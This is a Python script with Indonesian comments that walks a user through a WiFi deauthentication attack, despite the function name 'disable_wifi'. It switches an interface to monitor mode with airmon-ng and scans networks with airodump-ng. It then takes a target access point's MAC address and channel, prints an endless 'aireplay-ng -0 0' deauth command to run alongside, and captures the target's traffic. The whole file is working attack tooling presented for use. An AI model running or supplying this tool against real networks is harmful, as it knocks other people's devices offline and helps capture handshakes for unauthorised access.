import subprocess # Digunakan untuk menjalankan proses baru, terhubung ke pipa input/output/error mereka, dan mendapatkan kode pengembaliannya.
import optparse # Digunakan untuk mem-parsing opsi baris perintah.
import time # Menyediakan berbagai fungsi terkait waktu.
# Funngsi Parsing argument:
def arguments():
    parse = optparse.OptionParser()
    parse.add_option("-i","--iface",dest="interface",help="interface seperti wlan0 atau wlan0mon untuk melakukan tugas")
    options,arguments = parse.parse_args()
    if not options.interface:
        parse.error("enter interface -i Atau --iface")
    else:
        return options.interface
#     - Fungsi ini mendefinisikan antarmuka baris perintah untuk skrip menggunakan `optparse`.
#     - Diharapkan pengguna memberikan antarmuka melalui opsi `-i` atau `--iface`.
#     - Jika tidak ada antarmuka yang diberikan, maka akan menimbulkan kesalahan.
#     - Jika antarmuka diberikan, maka akan mengembalikan antarmuka yang diberikan.

# Fungsi Menonaktifkan wifi:
def  disable_wifi(_interface_):
    print("[+] "+_interface_+" Akan Berali Ke mode Monitor.......!!!! ")
    subprocess.call("airmon-ng start "+_interface_,shell = True)
    subprocess.call("ifconfig ",shell = True)
    time.sleep(2)
    print("[+] Enter interface Baru atau masukkan yang sama jika tidak dimodifikasi")
    new_interface = input("enter_interface_Baru:  ")
    try:
        print("[+] press Ctrl+c Untuk Menghentikan Proses.......!!!")
        time.sleep(1)
        subprocess.call("airodump-ng "+new_interface ,shell=True)
    except KeyboardInterrupt:
        print("[+] Ditemukan interrupt Keyboard Ctrl+c ......... sekarang masukkan yang beriku: ")
    target_mac_wifi = input("enter alamat mac wifi targe: ")
    target_wifi_channel = input("enter saluran wifi targe: ")
    print("[+] Detail Wifi Target.......!!!")
    try:
        print("press Ctrl+C  untuk menghentikan proses...........")
        print("Jalankan Pada shell lain aireplay-ng -0 0 -a " + target_mac_wifi + " " + new_interface)

        print("Jangan menghentikan proses ini saat Anda menjalankan perintah di shell lain")
        time.sleep(1)
        subprocess.call("airodump-ng --bssid "+target_mac_wifi+" --channel "+target_wifi_channel +" "+ new_interface,shell = True)
    except KeyboardInterrupt:
        print("[+] erdeteksi interrupt Keyboard.....!!")
#     - Fungsi ini mengambil antarmuka sebagai masukan dan melakukan tindakan berikut:
#         - Mengubah antarmuka ke mode monitor menggunakan `airmon-ng start`.
#         - Menampilkan konfigurasi antarmuka menggunakan `ifconfig`.
#         - Menunggu selama 2 detik.
#         - Meminta pengguna untuk memasukkan antarmuka baru atau yang sama jika tidak dimodifikasi.
#         - Menjalankan `airodump-ng` pada antarmuka baru.
#         - Meminta pengguna untuk memasukkan alamat MAC dan saluran WiFi target.
#         - Menampilkan detail WiFi target.
#         - Menjalankan `airodump-ng` yang ditargetkan ke WiFi yang ditentukan.
#     - Fungsi ini menangani pengecualian KeyboardInterrupt untuk memberikan cara keluar yang baik dari proses.

# fungsi utama:
def main():
    interface = arguments()
    disable_wifi(interface)

main()
#     - Fungsi ini hanya memanggil fungsi `arguments` untuk mendapatkan antarmuka dari pengguna dan kemudian memanggil fungsi `disable_wifi` dengan antarmuka tersebut.